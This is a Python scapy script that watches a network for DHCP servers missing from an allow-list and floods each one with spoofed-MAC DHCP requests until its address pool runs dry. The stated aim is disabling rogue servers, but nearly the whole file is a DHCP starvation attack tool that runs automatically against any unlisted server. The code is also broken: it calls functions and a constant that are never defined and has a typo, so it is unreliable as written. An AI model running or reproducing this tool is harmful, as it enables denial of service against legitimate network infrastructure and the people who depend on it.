from scapy.all import *
from random import randrange
import threading
import binascii
import argparse
import logging

CURRENTLY_ATTACKING = []
AUTHORIZED_SERVERS = []
LOGGER = None

DHCP_OPTIONS_ACK = 5
DHCP_OPTIONS_NAK = 6

def generate_mac():
    """
    Generates a mac address and a hardware address based on the mac.

    Return Value (tuple): containing the mac address and the hardware address.
    """

    mac = randrange(100000000000, 999999999999)
    mac = ':'.join(a+b for a, b in zip(str(mac)[::2], str(mac)[1::2]))
    chaddr = binascii.unhexlify(mac.replace(':', ''))
    return (mac, chaddr)


def generate_dhcp_discover(mac, server_ip, chaddr, xid):
    """
    Generates a DHCP Discover packet. 

    Parameters:
    mac (string): The mac to be used in the src address.
    server_ip (string): IP address of the server attacked.
    chaddr (string): Binary of the mac address without the colons.
    xid (string): Random id for a single DHCP sequence.

    Return Value (scapy.packet): The DHCP Discover packet generated.
    """

    dhcp_discover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / 
    IP(src='0.0.0.0', dst='255.255.255.255') / 
    UDP(dport=67, sport=68) / 
    BOOTP(op=1, xid=xid, chaddr=chaddr) / 
    DHCP(options=[('message-type','discover'), ('end')]))
    return dhcp_discover


def listen_dhcp_offer():
    """
    Sniffing a single DHCP packet.

    Return Value (scapy.packet): The sniffed DHCP packet.
    """
    # Listen to dhcp offers
    dhcp_offer = sniff(
        count=1,
        timeout=4,
        lfilter=lambda packet: DHCP in packet and packet[DHCP].options[0][1] == 2)
    return dhcp_offer


def generate_dhcp_request(server_ip, requested_addr, mac, chaddr, xid):
    """
    Generates a DHCP Request packet.

    Parameters:
    server_ip (string): The attacked DHCP servers ip address.
    requested_addr (string): The ip address offered in the DHCP offer.
    mac (string): A generated MAC address.
    chaddr (string): Binary of the mac address without the colons.
    xid (string): Random id for a single DHCP sequence.

    Return Value (scapy.packet): The genrated packet.
    """  

    dhcp_request = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / 
    IP(src='0.0.0.0', dst=server_ip) / 
    UDP(dport=67,sport=68) / 
    BOOTP(op=1, xid=xid ,chaddr=chaddr) / 
    DHCP(options=[
        ('message-type','request'), 
        ('client_id', binascii.unhexlify(('01'+mac).replace(':', ''))),
        ('requested_addr', requested_addr), 
        ('server_id', server_ip), 
        ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
        ('end')]))
    return dhcp_request


def filter_dhcp_ack(packet, xid):
    """
    Filters for DHCP ACK or DHCP NAK packets.

    Parameters:
    packet (scapy.packet): The packet to filter.
    xid (string): The sequence id.

    Return Value (Boolean): True if the packet is ACK or NAK, False if not.
    """

    if(DHCP in packet):
        packet.show()
    return (DHCP in packet 
    and (packet[DHCP].options[0][1] == DHCP_OPTIONS_ACK or packet[DHCP].options[0][1] == DHCP_NAK_CODE)
    and packet[BOOTP].xid == xid)


def listen_dhcp_ack(xid):
    """
    Sniffing a single DHCP Ack packet.

    Return Value (scapy.packet / NoneType): DHCP ACK packet / None.
    """
    dhcp_response = sniff(
    count=1,
    timeout=4,
    lfilter=lambda packet: filter_dhcp_ack_nak(packet, xide
    ))
    return dhcp_response


def starve_single_address(server_ip):
    """
    Starves a single address from the attacked DHCP server.

    Parameters:
    server_ip (string): The IP address of the attacked DHCP server.

    Return Value (Boolean): True if sniffed an ACK packet successfuly, False if failed .
    """
    (mac, chaddr) = generate_mac()
    xid = randrange(0, 100000)
    dhcp_discover = generate_dhcp_discover(mac, server_ip, chaddr, xid)
    LOGGER.info('Sending dhcp discover')
    sendp(dhcp_discover, verbose=0)
    dhcp_offer = listen_dhcp_offer()

    if(len(dhcp_offer) == 0):
        LOGGER.warning('No DHCP Offer Recieved')
        return False
    else:
        dhcp_offer = dhcp_offer[0]

    LOGGER.info('Sending dhcp request...')
    requested_addr = dhcp_offer[BOOTP].yiaddr
    dhcp_request = generate_dhcp_request(server_ip, requested_addr, mac, chaddr, xid)
    sendp(dhcp_request, verbose=0)
    dhcp_ack = listen_dhcp_ack_nak(xid)
    if(not dhcp_ack):
        LOGGER.error(f'Failed to get ack for {requested_addr}')
        return False
    elif(dhcp_ack[0][DHCP].options[0][1] == 5):
        LOGGER.info(f'Successto get ack for {requested_addr}')
        return True
    elif(dhcp_ack[0][DHCP].options[0][1] == 6):
        LOGGER.info(f'Finished attack againts {server_ip} - Success!')
        return False
    


def attack_dhcp_server(server_ip):
    """    
    Starves a single IP in a loop, until 5 consecutive failures or a NAK packet recieved.

    Parameters:
    server_ip (string): The attacked server IP

    Return Value (NoneType): None
    """

    global CURRENTLY_ATTACKING
    LOGGER.info(f'Initiating attack againts {server_ip}')

    CURRENTLY_ATTACKING.append(server_ip)
    
    consecutive_failures = 0

    while consecutive_failures < 5:
        is_address_starved = starve_single_address(server_ip)
        if(is_address_starved):
            consecutive_failures = 0
        else:
            consecutive_failures += 1

    CURRENTLY_ATTACKING.remove(server_ip)
    LOGGER.info(f'Finished Attack againts {server_ip}')



def dhcp_filter(packet):
    """
    Filters packets to find DHCP packets sourced from a rogue server.

   Return Value (Boolean): For a single packet, the function will return true if:
    - DHCP is in the packet
    - The packet is either DHCPACK or DHCPOFFER (src is a server)
    - The packet src is not on the authorized server and not currently attacked
    """

    return (DHCP in packet
    and (packet[DHCP].options[0][1] == 2 or packet[DHCP].options[0][1] == 5) 
    and packet[IP].src not in AUTHORIZED_SERVERS 
    and packet[IP].src not in CURRENTLY_ATTACKING)


def get_args():
    """
    Gets users arguments.

    Gets the arguments and append them to a global list of authorized servers.

    Return Value (NoneType): None
    """
    global AUTHORIZED_SERVERS

    parser = argparse.ArgumentParser(description='Attack rogue DHCP servers on your network.')                    
    parser.add_argument("--allowed", help="Authorized servers that should not be attacked", nargs='+')
    AUTHORIZED_SERVERS = parser.parse_args().allowed
    if(AUTHORIZED_SERVERS is None):
        AUTHORIZED_SERVERS = []
    

def main():
    """
    Sniff a packet sources from a rogue DHCP server and attacks it.

    Return Value (NoneType): None
    """
    global LOGGER

    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s', handlers=[logging.FileHandler('script.log'), logging.StreamHandler()])
    LOGGER = logging.getLogger()
    LOGGER.info('Listening to DHCP packets...')
    get_args()
    sniff(lfilter=dhcp_filter, prn=lambda packet: threading.Thread(target=attack_dhcp_server, args=(packet[IP].src,)).start())

if(__name__ == '__main__'):
    main()
